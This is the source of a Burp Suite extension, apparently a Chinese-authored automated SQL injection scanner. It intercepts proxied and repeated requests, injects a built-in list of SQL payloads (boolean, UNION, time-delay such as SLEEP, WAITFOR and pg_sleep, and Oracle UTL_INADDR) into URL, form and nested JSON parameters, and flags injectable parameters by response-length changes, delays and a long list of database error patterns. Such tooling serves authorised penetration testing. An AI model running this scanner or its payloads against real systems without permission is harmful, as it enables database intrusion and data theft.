#-- coding:UTF-8 --

from burp import IBurpExtender, ITab, IHttpListener,IScannerCheck, IMessageEditorController,IContextMenuFactory

from java.io import PrintWriter

from java.awt import GridLayout,FlowLayout,Dimension,Font,Color
from java.awt import Component
from java.awt.event import ActionEvent
from java.awt.event import ActionListener
from java.awt.event import ItemEvent
from java.awt.event import ItemListener

from javax import swing
from javax.swing import BoxLayout
from javax.swing import BorderFactory
from javax.swing.table import AbstractTableModel
from javax.swing.table import TableModel
from javax.swing.table import DefaultTableCellRenderer

from java.net import URLEncoder,URLDecoder
from java.net import URL
from java.nio.charset import StandardCharsets
from java.nio.charset import Charset
from java.util import ArrayList
import json
from thread import start_new_thread
from threading import Lock

import md5
import sys
import time
import re
import os
import codecs
reload(sys)
sys.setdefaultencoding('utf8')


log=list()#记录原始流量
log2=dict()#记录攻击流量
log3=list()#用于展现
log4_md5=list()#md5

currentlyDisplayedItem=None
requestViewer=None
responseViewer=None
secondModel=None
firstModel=None
helpers=None

errorPattern =[
    "Access Database Engine",
    "ADODB\\.Recordset'",
    "Column count doesn't match value count at row",
    "Column count doesn't match",
    "com.jnetdirect.jsql",
    "com.microsoft.sqlserver.jdbc",
    "com.mysql.jdbc",
    "DB2 SQL error",
    "Error SQL:",
    "java.sql.SQLException",
    "java.sql.SQLSyntaxErrorException",
    "macromedia.jdbc.sqlserver",
    "Microsoft Access",
    "Microsoft SQL Native Client error",
    "MySqlClient",
    "MySqlException",
    "MySQLSyntaxErrorException",
    "ODBC Microsoft Access",
    "ODBC SQL Server Driver",
    "ORA-\\d{5}",
    "Oracle error",
    "org.postgresql.jdbc",
    "PG::SyntaxError:",
    "Procedure '[^']+' requires parameter '[^']+'",
    "PSQLException",
    "SQL syntax.*?MySQL",
    "SQLite error",
    "SQLServer JDBC Driver",
    "Sybase message:",
    "SybSQLException",
    "Syntax error",
    "System.Exception: SQL Execution Error!",
    "Table '[^']+' doesn't exist",
    "the used select statements have different number of columns",
    "Unclosed quotation mark before the character string",
    "Unknown column",
    "valid MySQL result",
    "valid PostgreSQL result",
    "your MySQL server version",
    "附近有语法错误",
    "引号不完整",
    '(PLS|ORA)-[0-9][0-9][0-9][0-9]',
    '\\[CLI Driver\\]',
    '\\[DM_QUERY_E_SYNTAX\\]',
    '\\[Macromedia\\]\\[SQLServer JDBC Driver\\]',
    '\\[Microsoft\\]\\[ODBC Microsoft Access Driver\\]',
    '\\[Microsoft\\]\\[ODBC SQL Server Driver\\]',
    '\\[MySQL\\]\\[ODBC',
    '\\[SQL Server\\]',
    '\\[SqlException',
    '\\[SQLServer JDBC Driver\\]',
    '<b>Warning</b>:  ibase_',
    'A Parser Error \\(syntax error\\)',
    'ADODB\\.Field \\(0x800A0BCD\\)<br>',
    'An illegal character has been found in the statement',
    'com\\.informix\\.jdbc',
    'Data type mismatch in criteria expression.',
    'DB2 SQL error:',
    'Dynamic Page Generation Error:',
    'Dynamic SQL Error',
    'has occurred in the vicinity of:',
    'Incorrect syntax near',
    'INSERT INTO .*?',
    'internal error \\[IBM\\]\\[CLI Driver\\]\\[DB2/6000\\]',
    'java\\.sql\\.SQLException',
    'Microsoft JET Database Engine',
    'Microsoft OLE DB Provider for ODBC Drivers',
    'Microsoft OLE DB Provider for SQL Server',
    'mssql_query\\(\\)',
    'MySQL server version for the right syntax to use',
    'mysql_fetch_array\\(\\)',
    'odbc_exec\\(\\)',
    'on MySQL result index',
    'pg_exec\\(\\) \\[:',
    'pg_query\\(\\) \\[:',
    'PostgreSQL query failed:',
    'SELECT .*? FROM .*?',
    'Sintaxis incorrecta cerca de',
    'SQLSTATE=\\d+',
    'supplied argument is not a valid ',
    'Syntax error in query expression',
    'Syntax error in string in query expression',
    'System.Data.SqlClient.SqlException',
    'System\\.Data\\.OleDb\\.OleDbException',
    'Unclosed quotation mark after the character string',
    'Unexpected end of command in statement',
    'Unknown column',
    'UPDATE .*? SET .*?',
    'where clause',
    'You have an error in your SQL syntax near',
    'You have an error in your SQL syntax;'
]


class BurpExtender(IBurpExtender, ITab, IHttpListener,IScannerCheck, IMessageEditorController,IContextMenuFactory):

    # 自定义单元格渲染器，用于绿色高亮显示SQL注入漏洞
    class VulnerableCellRenderer(DefaultTableCellRenderer):
        def getTableCellRendererComponent(self, table, value, isSelected, hasFocus, row, column):
            component = super(BurpExtender.VulnerableCellRenderer, self).getTableCellRendererComponent(table, value, isSelected, hasFocus, row, column)
            
            # 获取表格模型和对应的LogEntry
            model = table.getModel()
            if hasattr(model, 'getVulnerableStatus'):
                is_vulnerable = model.getVulnerableStatus(row)
                if is_vulnerable and not isSelected:
                    # 设置绿色背景（检测到SQL注入漏洞）
                    component.setBackground(Color(144, 238, 144))  # 浅绿色
                elif is_vulnerable and isSelected:
                    # 选中状态下的绿色高亮
                    component.setBackground(Color(50, 205, 50))    # 深绿色
                elif not isSelected:
                    # 默认背景色
                    component.setBackground(table.getBackground())
            
            return component

    def processHttpMessage(self,toolFlag, messageIsRequest, messageInfo):
        if messageIsRequest == 0:
            if (toolFlag == 64 and self.chkbox2.isSelected()) or (toolFlag == 4 and self.chkbox3.isSelected()):
                start_new_thread(self.checkVul,(messageInfo, toolFlag,))

    def clearLog(self,actionEvent):
        global log,log2,log3,log4_md5
        log=[]#记录原始流量
        log2={}#记录攻击流量
        log3=[]#用于展现
        log4_md5=[]
        self.count=0
        firstModel.fireTableRowsInserted(0, 0)
        secondModel.fireTableRowsInserted(0, 0)
        print("清空列表")

    def getTabCaption(self):
        return unicode(" |2tina| SQL注入自动化 ","utf-8")

    def getUiComponent(self):
        return self.allPanel

    def createMenuItems(self, invocation):
        responses = invocation.getSelectedMessages()
        jMenu = swing.JMenuItem("Send to xia SQL")
        jMenu.addActionListener(start_new_thread(self.checkVul,(invocation.getSelectedMessages()[0], 1024,)))

        ret = list()
        ret.append(jMenu)
        return ret

    def registerExtenderCallbacks(self, callbacks):
        global requestViewer,responseViewer,secondModel,firstModel,helpers
        # 启动设置
        self.callbacks = callbacks
        helpers = callbacks.getHelpers()
        self.stdout = PrintWriter(callbacks.getStdout(), True)
        callbacks.registerHttpListener(self)
        callbacks.setExtensionName(unicode(" |2tina| SQL注入自动化 ","utf-8"))

        self.lock=Lock()

        self.count=0

        # payload file related state
        self.external_payloads = []
        self.payload_file_path = callbacks.loadExtensionSetting("xia_sql_payload_file")
        if not self.payload_file_path:
            self.payload_file_path = "payload.txt"

        # 最大日志条数（避免占用过多内存）
        self.max_logs = 300

        secondModel = self.SecondModel()
        firstModel = self.FirstModel()


        self.allPanel = swing.JSplitPane(swing.JSplitPane.HORIZONTAL_SPLIT)
        self.leftPanel = swing.JSplitPane(swing.JSplitPane.VERTICAL_SPLIT)


        self.resultPanel = swing.JSplitPane(swing.JSplitPane.HORIZONTAL_SPLIT)

        #url、param 界面
        self.firstTable = self.FirstTable(firstModel)
        self.firstTable.getColumnModel().getColumn(0).setPreferredWidth(25)
        self.firstTable.getColumnModel().getColumn(2).setPreferredWidth(230)
        self.firstScrollPane = swing.JScrollPane(self.firstTable)

        self.tablesPanel = swing.JPanel()
        self.label0 = swing.JLabel("==>")

        self.secondTable=self.SecondTable(secondModel)
        self.secondScrollPane=swing.JScrollPane(self.secondTable)

        self.tablesPanel.add(self.firstScrollPane)
        self.tablesPanel.add(self.label0)
        self.tablesPanel.add(self.secondScrollPane)


        #右边复选框
        self.rightPanel=swing.JPanel()
        # 使用垂直 BoxLayout，让下方 Payload 编辑区按首选尺寸显示
        self.rightPanel.setLayout(BoxLayout(self.rightPanel, BoxLayout.Y_AXIS))
        # 标题改回纯文本，较大粗体
        self.label=swing.JLabel(unicode(" |2tina| SQL注入自动化 ","utf-8"))
        try:
            self.label.setFont(Font("Dialog", Font.BOLD, 22))
        except Exception:
            pass
        # 统一边距
        self.rightPanel.setBorder(BorderFactory.createEmptyBorder(6,8,6,8))

        # 监控选项分组
        self.chkbox2=swing.JCheckBox(unicode("监控Repeater","utf-8"))
        self.chkbox3=swing.JCheckBox(unicode("监控Proxy","utf-8"))
        self.chkbox5=swing.JCheckBox(unicode("检查md5","utf-8"))
        self.chkbox3.setSelected(True)
        self.chkbox5.setSelected(True)
        checksPanel = swing.JPanel()
        checksPanel.setLayout(GridLayout(3,1,4,4))
        checksPanel.setBorder(BorderFactory.createTitledBorder(unicode("监控选项","utf-8")))
        checksPanel.add(self.chkbox2)
        checksPanel.add(self.chkbox3)
        checksPanel.add(self.chkbox5)

        # 字符集/操作行
        self.label4=swing.JLabel(unicode("URL字符集","utf-8"))
        self.box=swing.JComboBox(["UTF-8","GBK"])
        self.btn1=swing.JButton(unicode("清空列表","utf-8"),actionPerformed=self.clearLog)
        topRow = swing.JPanel(FlowLayout(FlowLayout.LEFT))
        topRow.add(self.label4)
        topRow.add(self.box)
        topRow.add(self.btn1)

        # 白名单分组
        self.label2=swing.JLabel(unicode("白名单域名请用,隔开（不检测）","utf-8"))
        self.textField = swing.JTextField(unicode(".*google.*,.*baidu.com","utf-8"))
        self.chkbox4=swing.JCheckBox(unicode("启动域名白名单","utf-8"))
        self.chkbox4.setSelected(True)
        self.label3=swing.JLabel(unicode("白名单参数请用,隔开（不检测）","utf-8"))
        self.textField_whitleParam = swing.JTextField("_t,timestamp,_")
        whitePanel = swing.JPanel()
        whitePanel.setLayout(BoxLayout(whitePanel, BoxLayout.Y_AXIS))
        whitePanel.setBorder(BorderFactory.createTitledBorder(unicode("白名单","utf-8")))
        whitePanel.add(self.label2)
        whitePanel.add(self.textField)
        whitePanel.add(self.chkbox4)
        whitePanel.add(self.label3)
        whitePanel.add(self.textField_whitleParam)

        # 组装：标题 -> 监控 -> 顶部行 -> 白名单
        self.rightPanel.add(self.label)
        self.rightPanel.add(checksPanel)
        self.rightPanel.add(topRow)
        self.rightPanel.add(whitePanel)

        # 最大日志条数设置
        self.maxLogsLabel = swing.JLabel(unicode("最大日志条数","utf-8"))
        self.maxLogsSpinner = swing.JSpinner(swing.SpinnerNumberModel(self.max_logs, 50, 5000, 50))
        self.rightPanel.add(self.maxLogsLabel)
        self.rightPanel.add(self.maxLogsSpinner)

        # payload file path input
        self.label_payload_path = swing.JLabel(unicode("Payload文件路径","utf-8"))
        self.payloadPathField = swing.JTextField(self.payload_file_path, 25)
        pathRow = swing.JPanel(FlowLayout(FlowLayout.LEFT))
        pathRow.add(self.label_payload_path)
        pathRow.add(self.payloadPathField)
        self.rightPanel.add(pathRow)

        # payload textarea and save button
        self.label_payload_list = swing.JLabel(unicode("Payload列表","utf-8"))
        self.rightPanel.add(self.label_payload_list)
        self.payloadTextArea = swing.JTextArea(22, 50)
        try:
            self.payloadTextArea.setLineWrap(True)
            self.payloadTextArea.setWrapStyleWord(True)
            self.payloadTextArea.setFont(Font("Monospaced", Font.PLAIN, 12))
        except Exception:
            pass
        self.payloadScrollPane = swing.JScrollPane(self.payloadTextArea)
        try:
            self.payloadScrollPane.setPreferredSize(Dimension(560, 360))
        except Exception:
            pass
        self.rightPanel.add(self.payloadScrollPane)
        self.savePayloadBtn = swing.JButton(unicode("保存Payload","utf-8"), actionPerformed=self.savePayloads)
        self.rightPanel.add(self.savePayloadBtn)

        requestViewer = callbacks.createMessageEditor(self, False)
        responseViewer = callbacks.createMessageEditor(self, False)

        self.resultPanel.add(requestViewer.getComponent())
        self.resultPanel.add(responseViewer.getComponent())
        self.resultPanel.setDividerLocation(550)


        self.leftPanel.setLeftComponent(self.tablesPanel)
        self.leftPanel.setRightComponent(self.resultPanel)

        self.allPanel.setLeftComponent(self.leftPanel)
        self.allPanel.setRightComponent(self.rightPanel)
        self.allPanel.setDividerLocation(1100)

        callbacks.customizeUiComponent(self.allPanel)
        callbacks.customizeUiComponent(self.leftPanel)
        callbacks.customizeUiComponent(self.tablesPanel)
        callbacks.customizeUiComponent(self.firstTable)
        callbacks.customizeUiComponent(self.secondTable)
        callbacks.customizeUiComponent(self.firstScrollPane)
        callbacks.customizeUiComponent(self.secondScrollPane)
        callbacks.customizeUiComponent(self.rightPanel)
        callbacks.customizeUiComponent(self.resultPanel)

        callbacks.addSuiteTab(self)

        callbacks.registerHttpListener(self)
        callbacks.registerScannerCheck(self)
        callbacks.registerContextMenuFactory(self)

        # 准备/载入payload文件
        self.ensurePayloadFile()
        self.reloadPayloads(initial=True)

        # 启动日志（横幅风格）
        try:
            banner = [
                "\n",
                "==============================================\n",
                "========       |2tina| SQL注入自动化     ========\n",
                "==============================================\n",
                "\n",
                "Author: 2tina\n",
                "Version: 1.0\n",
                "Github: https://github.com/2tina-sec\n",
                "\n",
                "Thank you for installing the  |2tina| SQL注入自动化 extension. We hope it enhances your workflow!\n",
                "\n",
                "Default Payload File: " + self.payload_file_path + "\n"
            ]
            for line in banner:
                self.stdout.println(unicode(line, 'utf-8'))
        except Exception:
            pass

    def ensurePayloadFile(self):
        # 如果payload文件不存在，创建一个带有常用payload的示例，便于开箱即用
        path = self.payload_file_path
        try:
            default_payloads = [
                    "'",
                    "''",
                    '"',
                    '""',
                    "-1",
                    "-0",
                    ",111",
                    ",1",
                    "' OR '1'='1",
                    "' OR '1'='1' -- ",
                    "') OR ('1'='1",
                    "') OR '1'='1' -- ",
                    '" OR "1"="1',
                    '" OR "1"="1" -- ',
                    "') OR 1=1 -- ",
                    "1' AND '1'='1",
                    "1' AND SLEEP(3)='1",
                    "1) AND (SELECT 1 FROM (SELECT(SLEEP(3)))a) -- ",
                    "1' OR SLEEP(3) -- ",
                    "0) UNION SELECT NULL -- ",
                    "0) UNION SELECT 1,2 -- ",
                    "0) UNION SELECT 1,2,3 -- ",
                    "' UNION SELECT NULL -- ",
                    "' UNION SELECT 1,2 -- ",
                    "' UNION SELECT 1,2,3 -- ",
                    "') UNION SELECT NULL -- ",
                    "') UNION SELECT 1,2 -- ",
                    "') UNION SELECT 1,2,3 -- ",
                    "'||SLEEP(3)||'",
                    "'||UTL_INADDR.GET_HOST_NAME(''||(SELECT banner FROM v$version WHERE ROWNUM=1))||'",
                    "';WAITFOR DELAY '0:0:3'--",
                    "-1) OR 1=1 -- ",
                    "' AND 1=2 UNION SELECT NULL -- ",
                    "' AND 1=2 UNION SELECT 1,2 -- ",
                    "' AND 1=2 UNION SELECT 1,2,3 -- ",
                    "') AND '1'='2 UNION SELECT 1,2 -- ",
                    """' OR 'a'='a' /*""",
                    "' OR 'a'='a' #",
                    "1 OR 1=1",
                    "1 OR 1=1-- ",
                    "1 OR SLEEP(3)",
                    "') OR SLEEP(3) AND ('1'='1",
                    ") OR pg_sleep(3)-- ",
                    "'||(SELECT pg_sleep(3))||'",
                    "') AND 1=(SELECT COUNT(*) FROM information_schema.tables)-- ",
                ]
            if not os.path.isfile(path):
                with codecs.open(path, 'w', 'utf-8') as f:
                    f.write("\n".join(default_payloads))
                try:
                    self.stdout.println(unicode("[+] 已创建默认 payload.txt (示例9条)", 'utf-8'))
                except Exception:
                    pass
            else:
                # 若存在但条目较少，自动合并去重，补全更多示例
                try:
                    with codecs.open(path, 'r', 'utf-8', errors='ignore') as f:
                        exist_lines = [l.strip() for l in f.readlines() if l.strip()]
                    merged = []
                    seen = set()
                    for x in exist_lines + default_payloads:
                        if x not in seen:
                            seen.add(x)
                            merged.append(x)
                    if len(merged) > len(exist_lines):
                        with codecs.open(path, 'w', 'utf-8') as f:
                            f.write("\n".join(merged))
                except Exception:
                    pass
        except Exception:
            pass

    def reloadPayloads(self, initial=False):
        try:
            path = self.payloadPathField.getText()
        except Exception:
            path = self.payload_file_path

        self.external_payloads = []
        content_text = ""
        count_loaded = 0
        if path and os.path.isfile(path):
            try:
                # prefer UTF-8 but tolerate others
                with codecs.open(path, 'r', 'utf-8', errors='ignore') as f:
                    lines = f.readlines()
                for raw in lines:
                    line = raw.strip()
                    if not line:
                        continue
                    if line.startswith('#') or line.startswith('//') or line.startswith('--'):
                        continue
                    self.external_payloads.append(line)
                content_text = ''.join(lines)
                count_loaded = len(self.external_payloads)
            except Exception:
                pass
        if hasattr(self, 'payloadTextArea') and content_text is not None:
            try:
                self.payloadTextArea.setText(content_text)
            except Exception:
                pass
        # persist path
        try:
            self.callbacks.saveExtensionSetting("xia_sql_payload_file", path)
        except Exception:
            pass
        # notify
        if count_loaded > 0:
            try:
                self.stdout.println(unicode("[+] 成功加载外部Payload文件 ", 'utf-8') + unicode(os.path.basename(path), 'utf-8') + unicode("，共 ", 'utf-8') + unicode(str(count_loaded), 'utf-8') + unicode(" 条", 'utf-8'))
            except Exception:
                pass
        elif initial:
            # 初次加载未读取到内容时也提示
            try:
                self.stdout.println(unicode("[+] 未检测到外部Payload或为空，使用内置基础Payload", 'utf-8'))
            except Exception:
                pass

    def savePayloads(self, actionEvent):
        # write current textarea to file and reload
        try:
            path = self.payloadPathField.getText()
            text = self.payloadTextArea.getText()
            if path:
                parent = os.path.dirname(path)
                if parent and not os.path.isdir(parent):
                    os.makedirs(parent)
                with codecs.open(path, 'w', 'utf-8') as f:
                    f.write(text)
                self.payload_file_path = path
                self.reloadPayloads()
        except Exception:
            pass

    def get_payloads(self, value, key):
        # base payloads from external list or defaults
        payloads = list(self.external_payloads) if len(self.external_payloads) > 0 else ["'","''","\"","\"\""]
        try:
            lower_key = (key or '').lower()
            lower_value = (value or '').lower()
        except Exception:
            lower_key = ''
            lower_value = ''
        # numeric contexts
        try:
            if re.match(r"^\d+$", str(value)):
                for extra in ["-1","-0"]:
                    if extra not in payloads:
                        payloads.append(extra)
        except Exception:
            pass
        # order/limit contexts
        if ("limit" in lower_key or "order" in lower_key or "sort" in lower_key or
            "asc" in lower_value or "desc" in lower_value):
            for extra in [",111",",1"]:
                if extra not in payloads:
                    payloads.append(extra)
        return payloads

    def checkVul(self,baseRequestResponse, toolFlag):
        #print("checkVul")
        global secondModel,firstModel,helpers,log4_md5,log

        change_sign_1 = ""
        error_sign    = ""
        analyResult = helpers.analyzeRequest(baseRequestResponse)

        paraLists   = analyResult.getParameters()
        data_url    = analyResult.getUrl().toString()
        contentType = analyResult.getContentType()
        method      = analyResult.getMethod()

        temp_data_strarray= data_url.split("?")
        purity_url = temp_data_strarray[0]
        str_for_md5 = purity_url

        #print(purity_url)

        if self.chkbox4.isSelected():
            whitle_URL_list=self.textField.getText().split(",")
            for each in whitle_URL_list:
                httpEach = 'https?://'+each
                if re.match(httpEach,purity_url):
                    #print("白名单URL\t"+purity_url)
                    return

        #用于判断页面后缀是否为静态文件
        if toolFlag == 4 or toolFlag ==64:
            static_file = {"jpg","png","bmp","ico","gif","css","js","map","pdf","mp3","mp4","avi","svg","woff2","woff","otf"}
            static_file_1 =purity_url.split(".")
            static_file_2 = static_file_1[-1]

            for each in static_file:
                if each==static_file_2:
                    #print("当前url为静态文件\t"+purity_url+"\n")
                    return

        str_md5 = ""
        for para in  paraLists:
            if para.getType() == 0 or para.getType() == 1 or para.getType() == 6 :
                str_for_md5+="&"
                str_for_md5+=para.getName()
        if str_for_md5==purity_url:
            return

        str_for_md5=method+' '+str_for_md5

        if self.chkbox5.isSelected()==False or toolFlag == 1024:
            str_for_md5 += str(time.time())

        str_md5 = self.getMd5(str_for_md5)
        #print(str_for_md5,str_md5,toolFlag)

        self.lock.acquire()

        if str_md5 in log4_md5:
            self.lock.release()
            return
        log4_md5.append(str_md5)

        self.lock.release()

        totalRes = helpers.bytesToString(baseRequestResponse.getResponse())
        if totalRes == None:
            totalRes=""
        resbody=""
        try:
            dataOffset=totalRes.find("\r\n\r\n")
            if dataOffset>0:
                resbody = totalRes[dataOffset+4:]
            original_data_len = len(resbody)
            #print(original_data_len)
            #if original_data_len <= 0:
            #    print("该数据包无响应")
        except Exception as e:
            original_data_len=0
            #print("该数据包无响应")

        log.append(self.LogEntry(self.count, baseRequestResponse,analyResult.getUrl(),"","","",str_md5,"","run...",999,original_data_len))
        self.count += 1

        # 控制内存占用：超出最大条数时从头部裁剪
        try:
            self.max_logs = int(self.maxLogsSpinner.getValue())
        except Exception:
            self.max_logs = 300
        if len(log) > self.max_logs:
            # 同步清理关联数据
            del_count = len(log) - self.max_logs
            for _ in range(del_count):
                old = log.pop(0)
                try:
                    if old.data_md5 in log2:
                        del log2[old.data_md5]
                except Exception:
                    pass
                try:
                    if old.data_md5 in log4_md5:
                        log4_md5.remove(old.data_md5)
                except Exception:
                    pass

        firstModel.fireTableRowsInserted(len(log), len(log))

        paraList= analyResult.getParameters()
        new_Request = baseRequestResponse.getRequest()
        iHttpService = baseRequestResponse.getHttpService()

        for para in paraList:

            if para.getType() == 0 or para.getType() == 1 :#url / post data
                key = para.getName()
                value = para.getValue()
                value_decodeurl = value
                lower_key = key.lower()
                lower_value = value.lower()

                time_1 = time_2 =0

                #key-value 中的json
                if lower_value.startswith("%7b") or lower_value.startswith("{") or lower_value.startswith("%5b") or lower_value.startswith("["):
                    if self.box.getSelectedItem()=="UTF-8":
                        charset = StandardCharsets.UTF_8
                    else:
                        charset = Charset.forName("GBK")
                    tmpvalue = URLDecoder.decode(value, charset)
                    urlFlag=0
                    if len(tmpvalue)!=value:
                        urlFlag = 1

                    tmpJson = json.loads(tmpvalue)
                    gen = self.processJson(tmpJson)

                    try:
                        resultLenList = []
                        while True:
                            newJson,currentPayload,nowKey = next(gen)
                            newJson=json.dumps(newJson)
                            if urlFlag==1:
                                newJson=URLEncoder.encode(newJson, charset)

                            newPara = helpers.buildParameter(key, newJson, para.getType())
                            newRequest = helpers.updateParameter(new_Request, newPara)
                            time_1 = time.time()*1000
                            requestResponse = self.callbacks.makeHttpRequest(iHttpService, newRequest)
                            time_2 = time.time()*1000

                            nowRes = helpers.bytesToString(requestResponse.getResponse())
                            if nowRes == None:
                                nowRes=""
                            nowOffset = nowRes.find("\r\n\r\n")
                            if nowOffset>0:
                                nowLen=len(nowRes)-nowOffset-4
                            else:
                                nowLen=0

                            if currentPayload == "'":
                                resultLenList=[]
                            resultLenList.append(nowLen)

                            v1,v2 = self.showDiff(requestResponse,currentPayload,int(time_2-time_1),nowKey,str_md5,original_data_len,resultLenList)
                            if change_sign_1 == "":
                                change_sign_1 = v1
                            if error_sign    == "":
                                error_sign =v2

                    except StopIteration:
                        pass
                else:#普通的key-value
                    whitleParams = self.textField_whitleParam.getText().split(',')
                    if key in whitleParams:
                        continue

                    payloads = self.get_payloads(value, key)

                    for currentPayload in payloads:
                        
                        newPara = helpers.buildParameter(key, value+currentPayload, para.getType())
                        newRequest = helpers.updateParameter(new_Request, newPara)
                        time_1 = time.time()*1000
                        requestResponse = self.callbacks.makeHttpRequest(iHttpService, newRequest)
                        time_2 = time.time()*1000
                        nowRes = helpers.bytesToString(requestResponse.getResponse())
                        if nowRes == None:
                            nowRes=""
                        nowOffset = nowRes.find("\r\n\r\n")
                        if nowOffset>0:
                            nowLen=len(nowRes)-nowOffset-4
                        else:
                            nowLen=0

                        if currentPayload == "'":
                            resultLenList=[]
                        resultLenList.append(nowLen)
                        v1,v2 = self.showDiff(requestResponse,currentPayload,int(time_2-time_1),key,str_md5,original_data_len,resultLenList)
                        if change_sign_1 == "":
                            change_sign_1 = v1
                        if error_sign    == "":
                            error_sign =v2

        if contentType == 4:#json

            headers=analyResult.getHeaders()

            totalRes = helpers.bytesToString(baseRequestResponse.getRequest())
            postbody="{}"
            dataOffset=totalRes.find("\r\n\r\n")
            if dataOffset>0:
                postbody = totalRes[dataOffset+4:]

            tmpJson = json.loads(postbody)
            gen = self.processJson(tmpJson)
            #print(tmpJson)
            try:
                while True:
                    newJson,currentPayload,nowKey = next(gen)

                    newJson=json.dumps(newJson)
                    newRequest = helpers.buildHttpMessage(headers,newJson)#newHeader headers

                    time_1 = time.time()*1000
                    requestResponse = self.callbacks.makeHttpRequest(iHttpService, newRequest)
                    time_2 = time.time()*1000
                    nowRes = helpers.bytesToString(requestResponse.getResponse())
                    if nowRes == None:
                        nowRes=""
                    nowOffset = nowRes.find("\r\n\r\n")
                    if nowOffset>0:
                        nowLen=len(nowRes)-nowOffset-4
                    else:
                        nowLen=0
                    if currentPayload == "'":
                        resultLenList=[]
                    resultLenList.append(nowLen)

                    v1,v2 = self.showDiff(requestResponse,currentPayload,int(time_2-time_1),nowKey,str_md5,original_data_len,resultLenList)
                    if change_sign_1 == "":
                        change_sign_1 = v1
                    if error_sign    == "":
                        error_sign =v2

            except StopIteration:
                pass


        for logEntry in log:
            if str_md5==logEntry.data_md5:
                logEntry.setState("end!" + change_sign_1+error_sign)

        nowRow = self.firstTable.getSelectedRow()

        firstModel.fireTableRowsInserted(len(log), len(log))
        firstModel.fireTableDataChanged()

        if nowRow>=0 and nowRow<len(log):
            self.firstTable.setRowSelectionInterval(nowRow,nowRow)

    def processJson(self,data,nowKey=''):#data是json格式的

        currentPayload=""
        if type(data) == dict:
            for each in data:
                if type(data[each]) in [list,dict]:
                    tmp=data[each]
                    gen = self.processJson(data[each],each)
                    try:
                        while True:
                            result,currentPayload,nowKey = next(gen)
                            data[each]=result
                            yield data,currentPayload,nowKey
                    except StopIteration:
                        data[each]=tmp

                if type(data[each])  in [str,unicode]:

                    tmpStr=data[each].lower()

                    if tmpStr.startswith("{") or tmpStr.startswith("%7b") or tmpStr.startswith("[") or tmpStr.startswith("%5b"):
                        #json
                        urlFlag=0
                        originStr=data[each]
                        if self.box.getSelectedItem()=="UTF-8":
                            charset = StandardCharsets.UTF_8
                        else:
                            charset = Charset.forName("GBK")
                        tmpStr = URLDecoder.decode(data[each], charset)
                        if len(tmpStr)!=len(data[each]):
                            urlFlag=1

                        tmp=json.loads(tmpStr)
                        gen = self.processJson(tmp)
                        try:
                            while True:
                                result,currentPayload,nowKey = next(gen)
                                result=json.dumps(result)
                                if urlFlag:
                                    result=URLEncoder.encode(data[each], charset)
                                data[each]=result
                                yield data,currentPayload,nowKey
                        except StopIteration:
                            data[each]=originStr
                    else:
                        tmp=data[each]
                        whitleParams = self.textField_whitleParam.getText().split(',')
                        if each in whitleParams:
                            continue
                        payloads = self.get_payloads(tmp, each)

                        for currentPayload in payloads:
                            data[each]=tmp+currentPayload
                            yield data,currentPayload,each
                        data[each]=tmp

                if type(data[each]) in [int,float]:
                    tmp=data[each]
                    whitleParams = self.textField_whitleParam.getText().split(',')
                    if each in whitleParams:
                        continue
                    payloads = self.get_payloads(str(tmp), each)

                    for currentPayload in payloads:
                        data[each]=str(tmp)+currentPayload
                        yield data,currentPayload,each
                    data[each]=tmp
        if type(data) == list:
            for i in range(len(data)):
                if type(data[i]) in [str,unicode]:
                    tmp=data[i]
                    payloads = self.get_payloads(tmp, nowKey)

                    for currentPayload in payloads:
                        data[i]=tmp+currentPayload
                        yield data,currentPayload,nowKey
                    data[i]=tmp

                if type(data[i]) in [list,dict]:
                    tmp=data[i]
                    gen = self.processJson(data[i],nowKey)
                    try:
                        while True:
                            result,currentPayload,nowKey = next(gen)
                            data[i]=result
                            yield data,currentPayload,nowKey
                    except StopIteration:
                        data[i]=tmp

    def showDiff(self,requestResponse,currentPayload,diffTime,key,str_md5,original_data_len,resultLenList):
        global log2,helpers,errorPattern
        change=0
        change_sign   = ""
        change_sign_1 = ""
        error_sign    = ""
        is_vulnerable = False  # 新增：标识是否检测到SQL注入漏洞
        
        #   '   ''  "   ""  -1  -0  ,111    ,1
        if len(resultLenList)%2==0:
            if resultLenList[-2] != original_data_len and resultLenList[-1] == original_data_len:
                change_sign = unicode("✔ ==> ?","utf-8")
                is_vulnerable = True  # 长度变化表示可能成功
            elif resultLenList[-2] != resultLenList[-1]:
                change_sign = unicode("✔ ","utf-8") + str(resultLenList[-2] - resultLenList[-1])
                is_vulnerable = True  # 长度变化表示可能成功

            if diffTime>8000:
                change_sign+=" time >8"
                is_vulnerable = True  # 时间延迟表示可能成功
            if change_sign!="":
                change_sign_1 = unicode(" ✔","utf-8")

        res = helpers.bytesToString(requestResponse.getResponse())
        if res != None:
            for each in errorPattern:
                pattern = re.compile(each, re.IGNORECASE)
                if pattern.search(res):
                    error_sign = " Err"
                    is_vulnerable = True  # 数据库错误表示成功
                    break

        # 创建LogEntry并设置漏洞状态
        logEntry = self.LogEntry(self.count, requestResponse,
                helpers.analyzeRequest(requestResponse).getUrl(),
                key, currentPayload, change_sign+error_sign, str_md5,diffTime, "end",
                helpers.analyzeResponse(requestResponse.getResponse()).getStatusCode(),resultLenList[-1])
        logEntry.setVulnerable(is_vulnerable)

        if str_md5 not in log2:
            log2[str_md5]=[]
        log2[str_md5].append(logEntry)
        return change_sign_1,error_sign

    def getMd5(self,key):
        m = md5.new()
        m.update(key)
        return m.hexdigest()

    def getRequest(self):
        return currentlyDisplayedItem.getRequest()

    def getResponse(self):
        return currentlyDisplayedItem.getResponse()

    def getHttpService(self):
        return currentlyDisplayedItem.getHttpService()

    class SecondModel (AbstractTableModel):

        def getRowCount(self,):
            global log3
            return len(log3)

        def getColumnCount(self,):
            return 6

        def getColumnName(self,columnIndex):
            if columnIndex==0:
                return unicode("参数","utf-8")
            elif columnIndex==1:
                return unicode("payload","utf-8")
            elif columnIndex==2:
                return unicode("返回包长度","utf-8")
            elif columnIndex==3:
                return unicode("变化","utf-8")
            elif columnIndex==4:
                return unicode("用时","utf-8")
            elif columnIndex==5:
                return unicode("响应码","utf-8")
            else:
                return ""

        def getColumnClass(self,columnIndex):
            return str

        def getValueAt(self,rowIndex, columnIndex):
            global log3
            logEntry = log3[rowIndex]

            if columnIndex == 0:
                    return logEntry.parameter
            elif columnIndex == 1:
                    return logEntry.value
            elif columnIndex == 2:
                if logEntry.requestResponse.getResponse()==None:
                    return 0
                tmp = helpers.bytesToString(logEntry.requestResponse.getResponse())
                return len(tmp)-tmp.find("\r\n\r\n")-4
            elif columnIndex == 3:
                    return logEntry.change
            elif columnIndex == 4:
                    return logEntry.times
            elif columnIndex == 5:
                    return logEntry.response_code
            else:
                return ""

